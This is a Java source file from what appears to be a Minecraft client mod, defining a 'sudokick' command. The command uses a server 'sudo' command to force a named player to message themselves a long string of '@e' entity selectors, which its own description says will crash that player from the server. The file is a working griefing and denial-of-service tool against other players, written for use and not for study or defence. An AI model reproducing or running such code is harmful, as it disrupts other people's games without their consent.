package me.blackilykat.test_client.commands.commands;

import me.blackilykat.test_client.Main;
import me.blackilykat.test_client.commands.Command;
import me.blackilykat.test_client.commands.arguments.StringArgument;
import me.blackilykat.test_client.exceptions.ExistingCommandException;
import me.blackilykat.test_client.util.Chat;

public class SudoKickCommand extends Command {
	public SudoKickCommand() throws ExistingCommandException {
		super("sudokick");
		withDescription("Makes the target message themselves @e@e@e@e@e@e... which will crash them from the server");
		withArgument(new StringArgument("Username"));
		runs(args -> {
			if(args.length == 0) {
				Chat.sendRed("You need to put a username!");
				return;
			}
			Main.MC.getNetworkHandler().sendCommand("sudo "+args[0]+" msg @s @e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e@e");
			Chat.sendGreen("Kicked " + args[0] + "!");
		});
	}
}
